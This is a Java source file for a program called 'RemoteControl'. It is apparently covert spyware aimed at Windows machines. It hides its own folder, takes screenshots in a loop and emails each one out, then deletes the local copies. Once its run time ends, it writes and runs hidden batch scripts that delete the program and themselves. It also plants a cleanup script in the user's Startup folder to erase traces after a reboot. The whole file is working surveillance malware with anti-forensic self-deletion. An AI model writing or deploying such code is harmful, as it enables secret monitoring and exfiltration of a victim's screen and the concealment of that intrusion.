package remotecontrol;

import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Properties;
import java.util.concurrent.TimeUnit;
import screencapture.ScreenCapture;
import sendemail.SendEmail;

/**
 * Main class of application - controls the course of the program.
 * 
 * @author Anonymous
 */

public class RemoteControl {

    /**
     * Main method of application - manages the program.
     * 
     * @param args the command line arguments
     */
    
    public static void main(String[] args) {
        
        RemoteControl remoteControl = new RemoteControl();

        Path currentRelativePath = Paths.get("");

        String projectPath = currentRelativePath.toAbsolutePath().toString();
        
        /*
        System.out.println(projectPath);
        System.out.println(remoteControl.getUserNameFromPath(projectPath));
        System.out.println(remoteControl.preparePathToStartUp(projectPath));
        */
        
        //for dist 18 for netbeans 13
        String batFilePath = projectPath.substring(0, projectPath.length() - 18);
        
        //for dist, for netbeans not use
        projectPath = projectPath.substring(0, projectPath.length() - 5);
        
        String autostartCleanerBatFilePath = remoteControl.createAutostartCleaner(remoteControl.preparePathToStartUp(projectPath), batFilePath, projectPath);

        try {
            Runtime.getRuntime().exec("cmd /c attrib +h /s /d " + projectPath);
        } catch (IOException e) {
            e.getMessage();
        }
        
        String autoCleanerBatFilePath = remoteControl.createAutoCleanerBatFile(projectPath, batFilePath, autostartCleanerBatFilePath);
        
        //remoteControl.createManualCleanerBatFile(projectPath, batFilePath); 

        ScreenCapture screenCapture = new ScreenCapture();

        SendEmail sendEmail = new SendEmail();
        
        int waitingTime = 2;
        int counterTime = 0;
        int totalWorkTime = 6;
        
        HashMap <String, String> timePropertiesMap = remoteControl.getProperties();
        
        waitingTime = Integer.parseInt(timePropertiesMap.get("waitingTime"));
        totalWorkTime = Integer.parseInt(timePropertiesMap.get("totalWorkTime"));
        
        boolean flowControlFlag = true;
        
        while (flowControlFlag) {
            
            String fileName = screenCapture.doCapture();

            try {
                sendEmail.send(fileName);
            } catch (javax.mail.MessagingException ex) {
                ex.getMessage();
            }

            screenCapture.deleteScreenCapture(fileName);
            
            try {
                System.out.println("Sleeping..." + waitingTime);
                TimeUnit.SECONDS.sleep(waitingTime);
                
            } catch (InterruptedException e) {
                e.getMessage();
            }
            
            counterTime += waitingTime;
            
            //System.out.println(counterTime);
            
            if(counterTime >= totalWorkTime){
                flowControlFlag = false;
            }
        }
        remoteControl.runAutoCleanerBatFilePath(autoCleanerBatFilePath);
    }
    
    /**
     * Method prepare bat file which kill program and delete all files automatically,
     * after specific time.
     * 
     * @param projectPath path to the project
     * @param batFilePath path to the .bat files
     * @return path to the autoPronto.bat
     */
    
    private String createAutoCleanerBatFile(String projectPath, String batFilePath, String autostartCleanerBatFilePath){
        
        try {

            FileWriter fileWriter = new FileWriter(batFilePath + "autoPronto.bat");
            //fileWriter.write("del /q " + batFilePath + "pronto.bat" + "\r\n");
            fileWriter.write("@echo off\r\n");
            fileWriter.write("cd..\r\n");
            fileWriter.write("cd..\r\n");
            fileWriter.write("chcp 28592\r\n");//only for polish signs
            fileWriter.write("rd /s /q \"" + projectPath + "\"\r\n");
            fileWriter.write("rd /s /q \"" + projectPath + "\"\r\n");
            fileWriter.write("del /f " + "\"" + autostartCleanerBatFilePath + "\"\r\n");
            fileWriter.write("del /q /A:H %0");
            fileWriter.close();

        } catch (IOException e) {
            e.getMessage();
        }
        
        try {
            Runtime.getRuntime().exec("cmd /c attrib +h " + batFilePath 
                    + "autoPronto.bat");
        } catch (IOException e) {
            e.getMessage();
        }
        
        return batFilePath + "autoPronto.bat";
    }
    
    /**
     * Method prepare bat file which kill program and delete all files after 
     * starting by the user.
     * 
     * @param projectPath path to the project
     * @param batFilePath path to the .bat files
     * @return path to the pronto.bat
     */
    
    private String createManualCleanerBatFile(String projectPath, String batFilePath){

        try {

            FileWriter fileWriter = new FileWriter(batFilePath + "pronto.bat");
            fileWriter.write("echo off\r\n");
            //fileWriter.write("chcp 28592\r\n");//only for polish signs
            fileWriter.write("taskkill /im javaw.exe /f\r\n");
            fileWriter.write("del /A:H /q " + batFilePath + "autoPronto.bat" + "\r\n");
            fileWriter.write("rd /s /q " + projectPath + "\r\n");
            fileWriter.write("rd /s /q " + projectPath + "\r\n");
            fileWriter.write("del /q %0");
            fileWriter.close();

        } catch (IOException e) {
            e.getMessage();
        }
        return batFilePath + "pronto.bat";
    }
    
    /**
     * Method rebuild path to the bat file for exec.
     * 
     * @param batFilePath path to the bat file
     * @return rebuilded path to the bat file
     */
    
    private String buildBatPathForExec(String batFilePath) {
        
        Character slash = 92;    // '\'

        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < batFilePath.length(); i++) {
            if (batFilePath.charAt(i) != slash) {
                stringBuilder.append(batFilePath.charAt(i));
            } else {
                stringBuilder.append(slash);
                stringBuilder.append(slash);
            }
        }
        return stringBuilder.toString();
    }
    
    /**
     * Method execute bat file which kill program and delete all files.
     * 
     * @param batFilePath path to the bat file
     */
    
    private void runAutoCleanerBatFilePath(String autoCleanerBatFilePath){
        
       try {
            Runtime.getRuntime().exec("cmd /c start /b " + autoCleanerBatFilePath);
        } catch (IOException e) {
            e.getMessage();
        }
    }
    
   /**
     * Method loads properties from time.properties file.
     * 
     * @return HashMap with time properties.
     */
    
    private HashMap getProperties(){
        
        Properties properties = new Properties();        
 
        HashMap <String, String> timePropertiesMap = new HashMap<>();

	try {
            InputStream input = new FileInputStream("time.properties");
            properties.load(input);
            
            timePropertiesMap.put("waitingTime", properties.getProperty("waitingTime"));
            timePropertiesMap.put("totalWorkTime", properties.getProperty("totalWorkTime"));
            timePropertiesMap.put("totalStartSystem", properties.getProperty("totalStartSystem"));

	} catch (IOException e) {
		e.getMessage();
        }
        
        if(timePropertiesMap.isEmpty()){
            timePropertiesMap.put("waitingTime", "20");
            timePropertiesMap.put("totalWorkTime", "14400");
            timePropertiesMap.put("totalStartSystem", "0");
        }

        return timePropertiesMap;
    }
    
    /**
     * Method reads the user's name from the path.
     * 
     * @param projectPath path to the project
     * @return user name
     */
    
    private String getUserNameFromPath(String projectPath){
        
        StringBuilder buildUser = new StringBuilder();
        
        int slashCounter = 0;
        
        for(int i = 0; i < projectPath.length(); i++){
            
            if(projectPath.charAt(i) == 92){
                slashCounter++;
            }
            
            if(projectPath.charAt(i) != 92 && slashCounter >= 2 && slashCounter < 3){
                buildUser.append(projectPath.charAt(i));
            }
            
            if(slashCounter > 3){
                break;
            }
        }       
        return buildUser.toString();
    }
    
    /**
     * Method prepares path to Startup folder.
     * 
     * @param projectPath path to the project
     * @return path to the Startup folder
     */
    
    private String preparePathToStartUp (String projectPath){
        
        StringBuilder buildPath = new StringBuilder();
        
        int slashCounter = 0;
        
        for(int i = 0; i < projectPath.length(); i++){
            
            if(projectPath.charAt(i) == 92){
                slashCounter++;
            }
            
            if(slashCounter < 3){
                buildPath.append(projectPath.charAt(i));
            }
            
            if(slashCounter > 3){
                break;
            }
        }       
        
        buildPath.append("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
        
        return buildPath.toString();
    }
    
    /**
     * Method prepare bat file which delete all project and related files after 
     * restart system.
     * 
     * @param batFileAutostartPath path to the bat file
     * @param projectPath path to the project
     */
    
    private String createAutostartCleaner(String batFileAutostartPath, String batFilePath, String projectPath){
        
        String fileName = "pronto3.bat";
        
         try {
             
            FileWriter fileWriter = new FileWriter(batFileAutostartPath + fileName);
            fileWriter.write("@echo off\r\n");
            fileWriter.write("chcp 28592\r\n");
            fileWriter.write("del /q /A:H " + "\"" + batFilePath + "autoPronto.bat" + "\"\r\n");
            //fileWriter.write("rd /q " + batFilePath + "pronto.bat" + "\r\n");
            fileWriter.write("rd /s /q " + "\"" + projectPath + "\"\r\n");
            fileWriter.write("rd /s /q " + "\"" + projectPath + "\"\r\n");
            fileWriter.write("del /q %0");
            fileWriter.close();

        } catch (IOException e) {
            e.getMessage();
        }
        return batFileAutostartPath + fileName;
    }
}
